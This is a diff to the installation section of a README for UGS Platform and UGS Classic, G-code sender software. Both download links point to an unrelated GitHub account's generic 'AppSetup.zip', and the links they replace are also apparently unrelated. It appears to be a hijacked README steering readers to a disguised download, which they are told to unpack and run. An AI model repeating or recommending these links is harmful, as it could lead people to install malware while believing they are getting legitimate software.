@@ -1,7 +1,7 @@
 ## Installing UGS Platform
 <img alt="UGS Platform" src="https://raw.githubusercontent.com/winder/Universal-G-Code-Sender/master/pictures/2.0_platform_ugs_platform.png" width="500" />
 
-* Download **UGS Platform** for your OS from [here](https://github.com/QingYunLife/TradingView/releases/download/Desktop/AppSetup.zip). 
+* Download **UGS Platform** for your OS from [here](https://github.com/Jiglxr/releases/releases/download/down/AppSetup.zip). 
 * Unpack the zip package
 * Start the program ```bin/ugsplatform```
 
@@ -11,7 +11,7 @@
 
 ### Windows
 * Download and install **Java 8** from [here](https://java.com/en/download/)
-* Download **UGS Classic** from [here](https://github.com/luis-marcelo/freshreleases/releases/download/FreshTag/AppSetup.zip)
+* Download **UGS Classic** from [here](https://github.com/Jiglxr/releases/releases/download/down/AppSetup.zip)
 * Unpack the zip package
 * Run the start script ```start.bat```
 
